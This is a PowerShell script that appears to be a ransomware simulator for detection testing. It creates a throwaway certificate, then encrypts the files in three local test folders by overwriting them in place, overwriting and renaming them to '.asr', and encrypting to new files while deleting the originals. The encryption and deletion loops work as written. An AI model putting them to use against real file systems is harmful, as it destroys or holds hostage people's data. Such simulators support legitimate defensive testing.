
$dir_encryptReplace = "encryptReplace"
$dir_encryptRename = "encryptRename"
$dir_encryptDelete = "encryptDelete"

$file_extension = "asr"

$cert_subject = "ransomware_sim_cert"
$cert_pass = "changeMe!"
$cert_store = "Cert:\CurrentUser\My"
$cert_export_cer = "public_key.cer"
$cert_export_pfx = "certificate.pfx"

# Certificate: Create > Export > Remove from storage > Import public key only
Write-Progress -Activity "CERTIFICATE" -Status "Creating self signed certificate..."
$cert = New-SelfSignedCertificate -DnsName $cert_subject -CertStoreLocation $cert_store -KeyUsage KeyEncipherment, DataEncipherment, KeyAgreement -Type DocumentEncryptionCert
$pass = ConvertTo-SecureString -String $cert_pass -Force -AsPlainText
Write-Progress -Activity "CERTIFICATE" -Status "Exporting certificate..."
Export-Certificate -Cert $cert -FilePath $cert_export_cer
Export-PfxCertificate -Cert $cert -Password $pass -FilePath $cert_export_pfx
Write-Progress -Activity "CERTIFICATE" -Status "Removing certificate from CertLocalStore..."
$cert | Remove-Item
Write-Progress -Activity "CERTIFICATE" -Status "Importing public key for encryption..."
$PUBLIC_KEY = Import-Certificate -FilePath $cert_export_cer -CertStoreLocation $cert_store

# Encrypt replacing file
$path=Join-Path -Path "$(Get-Location)" -ChildPath $dir_encryptReplace
$files = Get-ChildItem $path -Recurse -Force -Attributes !Directory
Write-Progress -Activity "SCENARIO 1: Encrypt replacing file contents: $($files.Length) files found on $path" -Status "Press any key to continue..."
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
$i = 0
foreach ($file in $files) {
    $i += 1
    Write-Progress -Activity "SCENARIO 1: Encrypt replacing file contents" -Status "Encrypting $($file.name)" -PercentComplete (100*($i/$files.Length))
    Get-Content $file.FullName | Protect-CmsMessage -To $cert.Subject -OutFile $file.FullName
}

# Encrypt replacing file + update file extension
$path=Join-Path -Path "$(Get-Location)" -ChildPath $dir_encryptRename
$files = Get-ChildItem $path -Recurse -Force -Attributes !Directory
Write-Progress -Activity "SCENARIO 2: Encrypt and update file extension: $($files.Length) files found on $path" -Status "Press any key to continue..."
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
$i = 0
foreach ($file in $files) {
    $i += 1
    Write-Progress -Activity "SCENARIO 2: Encrypt file and update file extension" -Status "Encrypting $($file.name)" -PercentComplete (100*($i/$files.Length))
    Get-Content $file.FullName | Protect-CmsMessage -To $cert.Subject -OutFile $file.FullName
    $file | Rename-Item -NewName { [io.path]::ChangeExtension($_.name, $file_extension) }
}

# Encrypt to new file > remove original
$path=Join-Path -Path "$(Get-Location)" -ChildPath $dir_encryptDelete
$files = Get-ChildItem $path -Recurse -Force -Attributes !Directory
Write-Progress -Activity "SCENARIO 3: Encrypt to a new file and remove original: $($files.Length) files found on $path" -Status "Press any key to continue..."
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
$i = 0
foreach ($file in $files) {
    $i += 1
    Write-Progress -Activity "SCENARIO 3: Encrypt to a new file and remove original" -Status "Encrypting $($file.name)" -PercentComplete (100*($i/$files.Length))
    Get-Content $file.FullName | Protect-CmsMessage -To $cert.Subject -OutFile "$($file.FullName).$file_extension"
    $file | Remove-Item
}

# Remove certificate from storage
$cert | Remove-Item
Write-Progress -Activity "CERTIFICATE: Public key removed from CertLocalStore" -Status "Press any key to finish..."
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
